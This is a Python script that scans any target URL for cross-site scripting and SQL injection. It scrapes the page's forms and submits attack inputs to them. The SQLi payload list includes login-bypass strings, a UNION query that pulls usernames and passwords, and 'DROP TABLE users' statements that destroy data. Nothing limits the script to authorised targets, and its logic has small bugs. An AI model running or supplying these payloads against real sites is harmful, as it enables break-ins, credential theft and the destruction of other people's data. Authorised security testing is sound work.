import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from pprint import pprint

# Initialize a session with a custom user agent
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

# Function to get all forms on a webpage
def get_forms(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    return soup.find_all("form")

# Function to extract form details (action, method, inputs) from a form
def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get")
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type,
            "name": input_name,
            "value": input_value,
        })

    detailsOfForm['action'] = action
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    return detailsOfForm

# Function to check if a response contains specific vulnerabilities
def vulnerable(response, vulnerabilities):
    for vulnerability in vulnerabilities:
        if vulnerability in response.content.decode().lower():
            return True
    return False

# Function to scan for XSS vulnerabilities
def scan_xss(url, js_code):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")

    is_vulnerable = False

    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_code).content.decode()
        if js_code in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable

# Function to scan for SQL injection vulnerabilities
def scan_sqli(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")

    sql_payloads = [
        "' OR '1'='1' -- ",
        '" OR "1"="1" -- ',
        "' OR '1'='1'; -- ",
        '" OR "1"="1"; -- ',
        "' OR '1'='1' -- -",
        '" OR "1"="1" -- -',
        "'; DROP TABLE users; -- ",
        '"; DROP TABLE users; -- ',
        "' OR 1=1; DROP TABLE users; -- ",
        '" OR 1=1; DROP TABLE users; -- ',
        "'; SELECT * FROM users; -- ",
        '"; SELECT * FROM users; -- ',
        "UNION SELECT username, password FROM users; -- ",
    ]

    for form in forms:
        details = form_details(form)
        vulnerabilities = ["quoted string not properly terminated",
                            "unclosed quotation mark after the character string",
                            "you have an error in your SQL syntax"]

        for sql_payload in sql_payloads:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag['name']] = input_tag["value"] + sql_payload
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"test{sql_payload}"

            print(url)
            form_details(form)

            if details["method"] == "post":
                res = s.post(url, data=data)
            elif details["method"] == "get":
                res = s.get(url, params=data)
            if vulnerable(res, vulnerabilities):
                print("SQL injection attack vulnerability in link:", url)
                break
            else:
                print("No SQL injection attack vulnerability detected")

# Function to extract form details for XSS scanning
def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# Function to submit a form with a given payload
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    print(f"[+] Submitting malicious payload to {target_url}")
    print(f"[+] Data: {data}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

if __name__ == "__main__":
    # User inputs the target URL
    target_url = input("Enter the target URL: ")
    
    # User chooses the scan type (1 for XSS, 2 for SQLi)
    choice = input("Choose the scan type (1 for XSS, 2 for SQLi): ")

    if choice == "1":
        # User inputs JavaScript code for XSS scanning
        js_code = input("Enter the JavaScript code for XSS scanning: ")
        print(scan_xss(target_url, js_code))
    elif choice == "2":
        scan_sqli(target_url)
    else:
        print("Invalid choice. Please choose 1 for XSS or 2 for SQLi.")
